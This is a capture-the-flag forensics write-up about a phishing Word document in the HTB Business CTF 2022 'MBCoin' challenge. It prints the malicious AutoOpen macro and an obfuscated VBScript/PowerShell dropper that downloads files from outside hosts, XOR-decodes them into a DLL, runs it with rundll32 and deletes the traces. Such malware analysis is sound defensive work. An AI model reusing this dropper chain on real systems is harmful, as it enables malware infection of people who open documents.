<!doctype html><html><head><title>Nitrate's writeups</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name=revised content="2022-07-18T14:31:54 UTC"><title>MBCoin :: Nitrate's writeups</title><link rel="shortcut icon" href=/writeups/images/favicon.png type=image/x-icon><link href=/writeups/css/nucleus.css rel=stylesheet><link href=/writeups/css/font-awesome.min.css rel=stylesheet><link href=/writeups/css/featherlight.min.css rel=stylesheet><link href=/writeups/css/auto-complete.css rel=stylesheet><link href=/writeups/theme-flex/style.css rel=stylesheet><link rel=stylesheet href=/writeups/css/bootstrap.min.css><link rel=stylesheet href=/writeups/css/custom.css></head><body data-url=/writeups/htb-business-ctf-2022-dirty-money/mbcoin/><header><div class=logo><a class=baselink href=https://n1trate.github.io/writeups>Nitrate's writeups</a></div><div class=burger><a href=javascript:void(0); style=font-size:15px>&#9776;</a></div></header><article><aside><ul class=menu><li data-nav-id=/ class=dd-item><a href=/><i class="fa fa-fw fa-home"></i></a></li><li data-nav-id=https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/ class="dd-item alwaysopen haschildren"><div><a href=/writeups/htb-business-ctf-2022-dirty-money/>HTB Business CTF 2022: Dirty Money</a>
<i class="fa fa-angle-down fa-lg category-icon"></i></div><ul><li data-nav-id=https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/linas-invitation/ class=dd-item><div><a href=/writeups/htb-business-ctf-2022-dirty-money/linas-invitation/>Lina's Invitation</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/mbcoin/ class=dd-item><div><a href=/writeups/htb-business-ctf-2022-dirty-money/mbcoin/>MBCoin</a></div></li></ul></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022/ class="dd-item alwaysopen haschildren"><div><a href=/writeups/nsec-2022/>NSec 2022</a>
<i class="fa fa-angle-down fa-lg category-icon"></i></div><ul><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022/portobello-denial/ class=dd-item><div><a href=/writeups/nsec-2022/portobello-denial/>Portobello - Denial</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022/portobello-depression/ class=dd-item><div><a href=/writeups/nsec-2022/portobello-depression/>Portobello - Depression</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022/portobello-bargaining/ class=dd-item><div><a href=/writeups/nsec-2022/portobello-bargaining/>Portobello - Bargaining</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022/portobello-anger/ class=dd-item><div><a href=/writeups/nsec-2022/portobello-anger/>Portobello - Anger</a></div></li></ul></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/ class="dd-item alwaysopen haschildren"><div><a href=/writeups/nsec-2022-warmup/>NSec 2022 WarmUp</a>
<i class="fa fa-angle-down fa-lg category-icon"></i></div><ul><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/kitty/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/kitty/>Kitty!</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/warmup-challenge-logically/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/warmup-challenge-logically/>Warmup challenge, logically</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/the-flag-is-a-secret/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/the-flag-is-a-secret/>The Flag Is A Secret</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/toque-tracking/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/toque-tracking/>Toque Tracking</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/northsec-flag-token/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/northsec-flag-token/>NorthSec Flag Token</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/vlc-of-the-mariner/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/vlc-of-the-mariner/>VLC of the Mariner</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/whamazon/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/whamazon/>Whamazon</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/warmup-flag-actual/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/warmup-flag-actual/>warmup flag (actual)</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/hidden-harware-secrets/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/hidden-harware-secrets/>Hidden Hardware Secrets</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/fuzzforfun/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/fuzzforfun/>FuzzForFun</a></div></li><li data-nav-id=https://n1trate.github.io/writeups/nsec-2022-warmup/montr%C3%A9al-remix/ class=dd-item><div><a href=/writeups/nsec-2022-warmup/montr%C3%A9al-remix/>Montréal Remix</a></div></li></ul></li><li data-nav-id=https://n1trate.github.io/writeups/tools/ class="dd-item alwaysopen"><div><a href=/writeups/tools/>Tools</a></div></li></ul><section></section></aside><section class=page><div class=nav-select><center>Navigation :
<select onchange="location.href=this.value"><option value=/writeups/htb-business-ctf-2022-dirty-money/>
HTB Business CTF 2022: Dirty Money</option><option value=/writeups/htb-business-ctf-2022-dirty-money/linas-invitation/>
-
Lina's Invitation</option><option value=/writeups/htb-business-ctf-2022-dirty-money/mbcoin/ selected>
-
MBCoin</option><option value=/writeups/nsec-2022/>
NSec 2022</option><option value=/writeups/nsec-2022/portobello-denial/>
-
Portobello - Denial</option><option value=/writeups/nsec-2022/portobello-depression/>
-
Portobello - Depression</option><option value=/writeups/nsec-2022/portobello-bargaining/>
-
Portobello - Bargaining</option><option value=/writeups/nsec-2022/portobello-anger/>
-
Portobello - Anger</option><option value=/writeups/nsec-2022-warmup/>
NSec 2022 WarmUp</option><option value=/writeups/nsec-2022-warmup/kitty/>
-
Kitty!</option><option value=/writeups/nsec-2022-warmup/warmup-challenge-logically/>
-
Warmup challenge, logically</option><option value=/writeups/nsec-2022-warmup/the-flag-is-a-secret/>
-
The Flag Is A Secret</option><option value=/writeups/nsec-2022-warmup/toque-tracking/>
-
Toque Tracking</option><option value=/writeups/nsec-2022-warmup/northsec-flag-token/>
-
NorthSec Flag Token</option><option value=/writeups/nsec-2022-warmup/vlc-of-the-mariner/>
-
VLC of the Mariner</option><option value=/writeups/nsec-2022-warmup/whamazon/>
-
Whamazon</option><option value=/writeups/nsec-2022-warmup/warmup-flag-actual/>
-
warmup flag (actual)</option><option value=/writeups/nsec-2022-warmup/hidden-harware-secrets/>
-
Hidden Hardware Secrets</option><option value=/writeups/nsec-2022-warmup/fuzzforfun/>
-
FuzzForFun</option><option value=/writeups/nsec-2022-warmup/montr%C3%A9al-remix/>
-
Montréal Remix</option><option value=/writeups/tools/>
Tools</option></select></center></div><div><div class=searchbox><input data-search-input id=search-by type=text placeholder=Search...></div></div><h1>MBCoin</h1><p>Challenge statement:<br><code>We have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months. This campaign abuses the current crypto market crash to target disappointed crypto owners. A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document. Analyze the supplied files and figure out what happened.</code></p><p>This writeup is a story of collaboration, mistakes, and sleep deprivation. We had a great time.</p><p>What was the first mistake&mldr; probably starting the challenge around 1:15 AM. I had just sovled Lina&rsquo;s Invitation and should have stopped there but&mldr;</p><p>It started by downloading the challenge <a href=forensics_mbcoin.zip>files</a>, in which we can find a pcap and a doc.</p><p>Opening the doc first, we can see a classic phishing document.<br><img src=doc.png alt=doc.png></p><p>Since we got a warning related to the macros when opening the file, it&rsquo;s worth to check out what there are.<br><img src=macro.png alt=macro.png></p><p>We can find the following macro wants to get executed when opening the file:</p><div class=highlight><pre tabindex=0 style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#007f7f>Rem Attribute VBA_ModuleType=VBAModule
</span></span></span><span style=display:flex><span><span style=color:#007f7f></span><span style=color:#fff;font-weight:700>Option</span> VBASupport 1
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>Sub</span> AutoOpen()
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>Dim</span> QQ1 As <span style=color:#fff;font-weight:700>Object</span>
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>Set</span> QQ1 = ActiveDocument.Shapes(1)
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>Dim</span> QQ2 As <span style=color:#fff;font-weight:700>Object</span>
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>Set</span> QQ2 = ActiveDocument.Shapes(2)
</span></span><span style=display:flex><span>    RO = StrReverse(<span style=color:#0ff;font-weight:700>&#34;\ataDmargorP\:C&#34;</span>)
</span></span><span style=display:flex><span>    ROI = RO + StrReverse(<span style=color:#0ff;font-weight:700>&#34;sbv.nip&#34;</span>)
</span></span><span style=display:flex><span>    ii = StrReverse(<span style=color:#0ff;font-weight:700>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    Ne = StrReverse(<span style=color:#0ff;font-weight:700>&#34;IZOIZIMIZI&#34;</span>)
</span></span><span style=display:flex><span>    WW = QQ1.AlternativeText + QQ2.AlternativeText
</span></span><span style=display:flex><span>    MyFile = FreeFile
</span></span><span style=display:flex><span>    Open ROI <span style=color:#fff;font-weight:700>For</span> Output As #MyFile
</span></span><span style=display:flex><span>    Print #MyFile, WW
</span></span><span style=display:flex><span>    Close #MyFile
</span></span><span style=display:flex><span>    fun = Shell(StrReverse(<span style=color:#0ff;font-weight:700>&#34;sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc&#34;</span>), Chr(48))
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    waitTill = Now() + TimeValue(<span style=color:#0ff;font-weight:700>&#34;00:00:05&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>While</span> Now() &lt; waitTill
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>Wend</span>
</span></span><span style=display:flex><span>    MsgBox (<span style=color:#0ff;font-weight:700>&#34;Unfortunately you are not eligable for free coin!&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#fff;font-weight:700>End</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>End</span> <span style=color:#fff;font-weight:700>Sub</span>
</span></span></code></pre></div><p>This script tries to write the value of <code>QQ1.AlternativeText + QQ2.AlternativeText</code> in a file named pin.vbs, and then execute it. QQ1 and QQ2 are two shapes in the document.</p><p>Somehow, in my LibreOffice, I couldn&rsquo;t get the AlternativeText of the shapes.<br><img src=Alternative.png alt=Alternative.png></p><p>I asked someone on my team, and they were able to give me the two chunks of code:</p><div class=highlight><pre tabindex=0 style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#fff;font-weight:700>Dim</span> WAITPLZ, WS, k, kl
</span></span><span style=display:flex><span>WAITPLZ = DateAdd(Chr(115), 4, Now())
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>Do</span> Until (Now() &gt; WAITPLZ)
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>Loop</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>LL1 = <span style=color:#0ff;font-weight:700>&#34;$Nano=&#39;JOOEX&#39;.replace(&#39;JOO&#39;,&#39;I&#39;);sal OY $Nano;$aa=&#39;(New-Ob&#39;; $qq=&#39;ject Ne&#39;; $ww=&#39;t.WebCli&#39;; $ee=&#39;ent).Downl&#39;; $rr=&#39;oadFile&#39;; $bb=&#39;(&#39;&#39;http://priyacareers.htb/u9hDQN9Yy7g/pt.html&#39;&#39;,&#39;&#39;C:\ProgramData\www1.dll&#39;&#39;)&#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join &#39;&#39;); OY $FOOX|OY;&#34;</span>
</span></span><span style=display:flex><span>LL2 = <span style=color:#0ff;font-weight:700>&#34;$Nanoz=&#39;JOOEX&#39;.replace(&#39;JOO&#39;,&#39;I&#39;);sal OY $Nanoz;$aa=&#39;(New-Ob&#39;; $qq=&#39;ject Ne&#39;; $ww=&#39;t.WebCli&#39;; $ee=&#39;ent).Downl&#39;; $rr=&#39;oadFile&#39;; $bb=&#39;(&#39;&#39;https://perfectdemos.htb/Gv1iNAuMKZ/jv.html&#39;&#39;,&#39;&#39;C:\ProgramData\www2.dll&#39;&#39;)&#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join &#39;&#39;); OY $FOOX|OY;&#34;</span>
</span></span><span style=display:flex><span>LL3 = <span style=color:#0ff;font-weight:700>&#34;$Nanox=&#39;JOOEX&#39;.replace(&#39;JOO&#39;,&#39;I&#39;);sal OY $Nanox;$aa=&#39;(New-Ob&#39;; $qq=&#39;ject Ne&#39;; $ww=&#39;t.WebCli&#39;; $ee=&#39;ent).Downl&#39;; $rr=&#39;oadFile&#39;; $bb=&#39;(&#39;&#39;http://bussiness-z.htb/ze8pCNTIkrIS/wp.html&#39;&#39;,&#39;&#39;C:\ProgramData\www3.dll&#39;&#39;)&#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join &#39;&#39;); OY $FOOX|OY;&#34;</span>
</span></span><span style=display:flex><span>LL4 = <span style=color:#0ff;font-weight:700>&#34;$Nanoc=&#39;JOOEX&#39;.replace(&#39;JOO&#39;,&#39;I&#39;);sal OY $Nanoc;$aa=&#39;(New-Ob&#39;; $qq=&#39;ject Ne&#39;; $ww=&#39;t.WebCli&#39;; $ee=&#39;ent).Downl&#39;; $rr=&#39;oadFile&#39;; $bb=&#39;(&#39;&#39;http://cablingpoint.htb/ByH5NDoE3kQA/vm.html&#39;&#39;,&#39;&#39;C:\ProgramData\www4.dll&#39;&#39;)&#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join &#39;&#39;); OY $FOOX|OY;&#34;</span>
</span></span><span style=display:flex><span>LL5 = <span style=color:#0ff;font-weight:700>&#34;$Nanoc=&#39;JOOEX&#39;.replace(&#39;JOO&#39;,&#39;I&#39;);sal OY $Nanoc;$aa=&#39;(New-Ob&#39;; $qq=&#39;ject Ne&#39;; $ww=&#39;t.WebCli&#39;; $ee=&#39;ent).Downl&#39;; $rr=&#39;oadFile&#39;; $bb=&#39;(&#39;&#39;https://bonus.corporatebusinessmachines.htb/1Y0qVNce/tz.html&#39;&#39;,&#39;&#39;C:\ProgramData\www5.dll&#39;&#39;)&#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join &#39;&#39;); OY $FOOX|OY;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HH9=<span style=color:#0ff;font-weight:700>&#34;po&#34;</span>
</span></span><span style=display:flex><span>HH8=<span style=color:#0ff;font-weight:700>&#34;wers&#34;</span>
</span></span><span style=display:flex><span>HH7=<span style=color:#0ff;font-weight:700>&#34;h&#34;</span>
</span></span><span style=display:flex><span>HH6=<span style=color:#0ff;font-weight:700>&#34;ell &#34;</span>
</span></span><span style=display:flex><span>HH0= HH9+HH8+HH7+HH6
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>Set</span> Ran = CreateObject(<span style=color:#0ff;font-weight:700>&#34;wscript.shell&#34;</span>)
</span></span><span style=display:flex><span>Ran.Run HH0+LL1,Chr(48)
</span></span><span style=display:flex><span>Ran.Run HH0+LL2,Chr(48)
</span></span><span style=display:flex><span>Ran.Run HH0+LL3,Chr(48)
</span></span><span style=display:flex><span>Ran.Run HH0+LL4,Chr(48)
</span></span><span style=display:flex><span>Ran.Run HH0+LL5,Chr(48)
</span></span><span style=display:flex><span>Wscript.Sleep(5000)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span>MM1 = <span style=color:#0ff;font-weight:700>&#34;$b = [System.IO.File]::ReadAllBytes(((&#39;C:GPH&#39;+&#39;pr&#39;+&#39;og&#39;+&#39;ra&#39;+&#39;mdataG&#39;+&#39;PHwww1.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;gl&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;KO&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;X&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((&#39;C:Y9Apro&#39;+&#39;gramdat&#39;+&#39;a&#39;+&#39;Y&#39;+&#39;9Awww&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}&#34;</span>
</span></span><span style=display:flex><span>MM2 = <span style=color:#0ff;font-weight:700>&#34;$b = [System.IO.File]::ReadAllBytes(((&#39;C:GPH&#39;+&#39;pr&#39;+&#39;og&#39;+&#39;ra&#39;+&#39;mdataG&#39;+&#39;PHwww2.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;pc&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;Au&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;P&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]};  if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((&#39;C:Y9Apro&#39;+&#39;gramdat&#39;+&#39;a&#39;+&#39;Y&#39;+&#39;9Awww&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}&#34;</span>
</span></span><span style=display:flex><span>MM3 = <span style=color:#0ff;font-weight:700>&#34;$b = [System.IO.File]::ReadAllBytes(((&#39;C:GPH&#39;+&#39;pr&#39;+&#39;og&#39;+&#39;ra&#39;+&#39;mdataG&#39;+&#39;PHwww3.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;WG&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;OL&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;s&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((&#39;C:Y9Apro&#39;+&#39;gramdat&#39;+&#39;a&#39;+&#39;Y&#39;+&#39;9Awww&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}&#34;</span>
</span></span><span style=display:flex><span>MM4 = <span style=color:#0ff;font-weight:700>&#34;$b = [System.IO.File]::ReadAllBytes(((&#39;C:GPH&#39;+&#39;pr&#39;+&#39;og&#39;+&#39;ra&#39;+&#39;mdataG&#39;+&#39;PHwww4.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;oN&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;Py&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;G&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((&#39;C:Y9Apro&#39;+&#39;gramdat&#39;+&#39;a&#39;+&#39;Y&#39;+&#39;9Awww&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}&#34;</span>
</span></span><span style=display:flex><span>MM5 = <span style=color:#0ff;font-weight:700>&#34;$b = [System.IO.File]::ReadAllBytes(((&#39;C:GPH&#39;+&#39;pr&#39;+&#39;og&#39;+&#39;ra&#39;+&#39;mdataG&#39;+&#39;PHwww5.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;IE&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;YL&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;a&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((&#39;C:Y9Apro&#39;+&#39;gramdat&#39;+&#39;a&#39;+&#39;Y&#39;+&#39;9Awww&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fff;font-weight:700>Set</span> Ran = CreateObject(<span style=color:#0ff;font-weight:700>&#34;wscript.shell&#34;</span>)
</span></span><span style=display:flex><span>Ran.Run HH0+MM1,Chr(48)
</span></span><span style=display:flex><span>WScript.Sleep(500)
</span></span><span style=display:flex><span>Ran.Run HH0+MM2,Chr(48)
</span></span><span style=display:flex><span>WScript.Sleep(500)
</span></span><span style=display:flex><span>Ran.Run HH0+MM3,Chr(48)
</span></span><span style=display:flex><span>WScript.Sleep(500)
</span></span><span style=display:flex><span>Ran.Run HH0+MM4,Chr(48)
</span></span><span style=display:flex><span>WScript.Sleep(500)
</span></span><span style=display:flex><span>Ran.Run HH0+MM5,Chr(48)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>WScript.Sleep(15000)
</span></span><span style=display:flex><span>OK1 = <span style=color:#0ff;font-weight:700>&#34;cmd /c rundll32.exe C:\ProgramData\www.dll,ldr&#34;</span>
</span></span><span style=display:flex><span>OK2 = <span style=color:#0ff;font-weight:700>&#34;cmd /c del C:\programdata\www*&#34;</span>
</span></span><span style=display:flex><span>OK3 = <span style=color:#0ff;font-weight:700>&#34;cmd /c del C:\programdata\pin*&#34;</span>
</span></span><span style=display:flex><span>Ran.Run OK1, Chr(48)
</span></span><span style=display:flex><span>WScript.Sleep(1000)
</span></span><span style=display:flex><span>Run.Run OK2, Chr(48)
</span></span><span style=display:flex><span>Run.Run OK3, Chr(48)
</span></span></code></pre></div><p>Globally, what those two scripts chunk are doing is</p><ul><li>download a file from a website</li><li>save it as wwwN.dll (N from 1 to 5)</li><li>for each of them, apply a transformation on the data and save the output as www.dll</li><li>finally execute the exported function named ldr of that www.dll</li><li>clean everything up</li></ul><p>Since powershell is using <code>[System.IO.File]::WriteAllBytes</code> to create the www.dll file(s) one after the other, only the last one will be kept to be ran.</p><p>We can&rsquo;t access those websites, but this is where the pcap comes into play. Looking at the pcap, we can download two of the files : pt.html and vm.html. Those can also be known as www1.dll and www4.dll respectively.<br><img src=ptpcap.png alt=ptpcap.png><br><img src=vmpcap.png alt=vmpcap.png></p><p>Somehow, the stream for vm.html was a bit weird, with the time of the packet #40 not being handled nicely. It didn&rsquo;t stop us from exporting the bytes as a file, and now, it&rsquo;s time to spin up a windows machine!</p><p>We can execute the following two lines individually. I modified the paths so they would point locally instead of into C:\programdata.</p><div class=highlight><pre tabindex=0 style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>$b = [System.IO.File]::ReadAllBytes(((<span style=color:#0ff;font-weight:700>&#39;www1.d&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;ll&#39;</span>)  -CrePLacE<span style=color:#0ff;font-weight:700>&#39;GPH&#39;</span>,[Char]92)); $k = (<span style=color:#0ff;font-weight:700>&#39;6i&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;I&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;gl&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;o&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;Mk5&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;iRYAw&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;7Z&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;TWed0Cr&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;juZ9wijyQDj&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;KO&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;Om1&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;X&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;pjmYfaQX&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;acA6&#39;</span>); $r = <span style=color:#fff;font-weight:700>New-Object</span> Byte[] $b.length; <span style=color:#fff;font-weight:700>for</span>($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; <span style=color:#fff;font-weight:700>if</span> ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((<span style=color:#0ff;font-weight:700>&#39;www&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;.d&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;ll&#39;</span>).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
</span></span><span style=display:flex><span><span style=color:#007f7f>#$b = [System.IO.File]::ReadAllBytes(((&#39;www2.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;pc&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;Au&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;P&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]};  if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((&#39;www&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}</span>
</span></span><span style=display:flex><span><span style=color:#007f7f>#$b = [System.IO.File]::ReadAllBytes(((&#39;www3.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;WG&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;OL&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;s&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((&#39;www&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}</span>
